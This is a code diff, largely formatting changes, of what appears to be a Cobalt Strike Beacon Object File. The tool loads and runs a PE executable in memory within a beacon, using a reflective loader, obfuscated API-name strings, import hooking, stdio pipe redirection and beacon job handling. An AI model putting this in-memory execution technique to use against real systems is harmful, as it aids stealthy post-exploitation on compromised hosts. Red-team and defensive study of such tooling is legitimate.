@@ -5,11 +5,13 @@
 #endif
 
 extern "C" {
-#include "inlinecommon.hpp"
+// clang-format off
+#include "inlinecommon.h"
+// clang-format on
 
 #include "ReflectiveLoaderEx.c"
-#include "globalshareddata.c"
-#include "simplelist1.c"
+#include "globalshareddata.cc"
+#include "simplelist1.cc"
 
 WINBASEAPI NTSTATUS NTAPI NtFlushInstructionCache(HANDLE ProcessHandle,
                                                   PVOID BaseAddress,
@@ -39,32 +41,41 @@ BOOL CheckPEImage(void *peImage, int peImageSize) {
   PIMAGE_NT_HEADERS nt = NULL;
 
   // Check if the PE image is empty
-  if (!peImage || !peImageSize)
+  if (!peImage || !peImageSize) {
     goto empty;
+  }
 
   // Check the DOS header
-  if ((UINT)peImageSize < sizeof(IMAGE_DOS_HEADER))
+  if ((UINT)peImageSize < sizeof(IMAGE_DOS_HEADER)) {
     goto tooSmall;
+  }
   dos = (PIMAGE_DOS_HEADER)p;
-  if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
     goto invalidMagic;
+  }
 
   // Check the NT header
   nt = (PIMAGE_NT_HEADERS)(p + dos->e_lfanew);
-  if ((UINT)peImageSize < dos->e_lfanew + sizeof(IMAGE_NT_HEADERS))
+  if ((UINT)peImageSize < dos->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
     goto tooSmall;
-  if (nt->Signature != IMAGE_NT_SIGNATURE)
+  }
+  if (nt->Signature != IMAGE_NT_SIGNATURE) {
     goto invalidMagic;
-  if (nt->FileHeader.Machine !=
-      (sizeof(PVOID) == 4 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64))
+  }
+  if (nt->FileHeader.Machine != (sizeof(PVOID) == 4
+                                     ? IMAGE_FILE_MACHINE_I386
+                                     : IMAGE_FILE_MACHINE_AMD64)) {
     goto invalidMagic;
+  }
 
   // Check the optional header
-  if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
+  if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
     goto invalidMagic;
+  }
   if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR]
-          .VirtualAddress)
+          .VirtualAddress) {
     goto dotnet;
+  }
 
   return TRUE;
 
@@ -85,8 +96,9 @@ dotnet:
 // TODO: Add proxy dll loading https://github.com/kleiton0x00/Proxy-DLL-Loads
 HMODULE GetOrLoadDll(LPCSTR dllName) {
   HMODULE handle = GetModuleHandleA(dllName);
-  if (handle)
+  if (handle) {
     return handle;
+  }
   handle = LoadLibraryA(dllName);
   TRACEF("LoadLibraryA(%s): %p", dllName, handle);
   return handle;
@@ -95,9 +107,9 @@ HMODULE GetOrLoadDll(LPCSTR dllName) {
 #define GetOrLoadDll2(m) GetOrLoadDll(xorstr_(m))
 #define GetProcAddress2(m, f) ((PVOID)GetProcAddress(m, xorstr_(f)))
 
-#include "jobs1.c"
-#include "jobs2.c"
-#include "seh.c"
+#include "jobs1.cc"
+#include "jobs2.cc"
+#include "seh.cc"
 
 void ImportHookApis(HookContext *ctx) {
   // clang-format off
@@ -154,8 +166,9 @@ void ImportHookApis(HookContext *ctx) {
   int apiCount = (int)(&ctx->MyGetProcAddress - apis);
   for (int i = 0; i < apiCount; i++) {
     TRACEF("Api[%d]: %p", i, apis[i]);
-    if (!apis[i])
+    if (!apis[i]) {
       PRINTF_ERR("Api[%d] is NULL.", i);
+    }
   }
 }
 
@@ -188,8 +201,7 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
    */
 
   TRACEF("1. Validate the PE image");
-  if (!CheckPEImage(peImage, peImageSize))
-    goto err;
+  if (!CheckPEImage(peImage, peImageSize)) goto err;
 
   /*
    * 2. Prepare hook
@@ -230,8 +242,7 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
       goto err;
     }
     commandLineWSize = 0;
-    while (commandLineW[commandLineWSize++] != L'\0')
-      ;
+    while (commandLineW[commandLineWSize++] != L'\0');
     commandLineWSize *= 2;
   } else {
     commandLineWSize = 0;
@@ -252,9 +263,11 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
       hookCtx->JobOutputWriteHandle = hJobWritePipe;
       hookCtx->JobOutputLock = 0;
       TRACEF("Job %d was added. Never use 'jobkill' for this PE image!", jobId);
-    } else
-      PRINTF_ERR("Failed to add job. Fall back to normal async log. Use "
-                 "'inline-log-pe' to fetch logs manually.");
+    } else {
+      PRINTF_ERR(
+          "Failed to add job. Fall back to normal async log. Use "
+          "'inline-log-pe' to fetch logs manually.");
+    }
   }
 
   output = (HookOutput *)malloc(sizeof(HookOutput));
@@ -274,33 +287,33 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
                             commandLineA, commandLineASize, commandLineW,
                             commandLineWSize);
   switch (result) {
-  case HookResultSuccess:
-    break;
-  case HookResultErrorCreateCommandLine:
-    PRINTF_ERR("Failed to allocate command-line.");
-    goto err;
-  case HookResultErrorCreatePipeServers:
-    PRINTF_ERR("Failed to create pipe servers to redirect stdio.");
-    goto err;
-  case HookResultErrorCreateNewThreadList:
-    PRINTF_ERR("Failed to allocate new thread list.");
-    goto err;
-  case HookResultErrorCreateExceptionHandlerList:
-    PRINTF_ERR("Failed to allocate exception handler list.");
-    goto err;
-  case HookResultErrorCreateMemoryList:
-    PRINTF_ERR("Failed to allocate memory list.");
-    goto err;
-  case HookResultErrorCreateTlsList:
-    PRINTF_ERR("Failed to allocate tls list.");
-    goto err;
-  case HookResultErrorCreateKernel32Base:
-    PRINTF_ERR("Failed to get kernel32.dll image base.");
-    goto err;
-  default:
-    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
-               result);
-    goto err;
+    case HookResultSuccess:
+      break;
+    case HookResultErrorCreateCommandLine:
+      PRINTF_ERR("Failed to allocate command-line.");
+      goto err;
+    case HookResultErrorCreatePipeServers:
+      PRINTF_ERR("Failed to create pipe servers to redirect stdio.");
+      goto err;
+    case HookResultErrorCreateNewThreadList:
+      PRINTF_ERR("Failed to allocate new thread list.");
+      goto err;
+    case HookResultErrorCreateExceptionHandlerList:
+      PRINTF_ERR("Failed to allocate exception handler list.");
+      goto err;
+    case HookResultErrorCreateMemoryList:
+      PRINTF_ERR("Failed to allocate memory list.");
+      goto err;
+    case HookResultErrorCreateTlsList:
+      PRINTF_ERR("Failed to allocate tls list.");
+      goto err;
+    case HookResultErrorCreateKernel32Base:
+      PRINTF_ERR("Failed to get kernel32.dll image base.");
+      goto err;
+    default:
+      PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
+                 result);
+      goto err;
   }
 
   /*
@@ -336,8 +349,9 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
          imageBase, (UINT)imageSize, entryPoint);
   sharedData = GetGlobalSharedData();
   for (index = 0; index < LoadedPEImageMax; index++) {
-    if (!sharedData->PEImages[index].ImageBase)
+    if (!sharedData->PEImages[index].ImageBase) {
       break;
+    }
   }
   if (index == LoadedPEImageMax) {
     PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
@@ -352,8 +366,7 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
   loadedPEImage->Output = output;
   sharedData->LastImageBase = imageBase;
   hookCtx->PEImage = loadedPEImage;
-  if (loadedImageBase)
-    *loadedImageBase = imageBase;
+  if (loadedImageBase) *loadedImageBase = imageBase;
   TRACEF("PE image %p was added to global shared data index %d.", imageBase,
          index);
 
@@ -365,15 +378,15 @@ HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
 
   result = hookControlEntry(HookControlStart, entryPoint);
   switch (result) {
-  case HookResultSuccess:
-    break;
-  case HookResultErrorStartNewThread:
-    PRINTF_ERR("Failed to create new thread to run exe entry-point.");
-    goto err;
-  default:
-    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
-               result);
-    goto err;
+    case HookResultSuccess:
+      break;
+    case HookResultErrorStartNewThread:
+      PRINTF_ERR("Failed to create new thread to run exe entry-point.");
+      goto err;
+    default:
+      PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
+                 result);
+      goto err;
   }
   loadedPEImage->IsRunning = TRUE;
   TRACEF("Thread of exe entry-point was created.");
@@ -395,17 +408,13 @@ err:
     SimpleListFree(&output->Logs);
     free(output);
   }
-  if (jobList)
-    SimpleRemoveJob(jobList, jobId);
+  if (jobList) SimpleRemoveJob(jobList, jobId);
 #ifndef HOOKS_DLL
-  if (hookBase)
-    VirtualFree(hookBase, 0, MEM_RELEASE);
+  if (hookBase) VirtualFree(hookBase, 0, MEM_RELEASE);
 #endif
-  if (hookCtx)
-    free(hookCtx);
+  if (hookCtx) free(hookCtx);
 out:
-  if (commandLineW)
-    free(commandLineW);
+  if (commandLineW) free(commandLineW);
 
   TRACEF("End run pe.");
 
@@ -425,10 +434,11 @@ void go(char *argv, int argc) {
   int commandLineASize = 0;
   char *commandLineA = BeaconDataExtract(&parser, &commandLineASize);
   int jobVersion = BeaconDataInt(&parser);
-  TRACEF("Arguments was parsed. (features: %x, stdin: %p (%d bytes), peImage: "
-         "%p (%d bytes), commandLineA: %s (%d bytes), jobVersion: %d)",
-         features, stdin_, stdinSize, peImage, peImageSize, commandLineA,
-         commandLineASize, jobVersion);
+  TRACEF(
+      "Arguments was parsed. (features: %x, stdin: %p (%d bytes), peImage: "
+      "%p (%d bytes), commandLineA: %s (%d bytes), jobVersion: %d)",
+      features, stdin_, stdinSize, peImage, peImageSize, commandLineA,
+      commandLineASize, jobVersion);
 
   InlineExecutePE(features, stdin_, stdinSize, peImage, peImageSize,
                   commandLineA, commandLineASize, jobVersion, NULL, NULL);
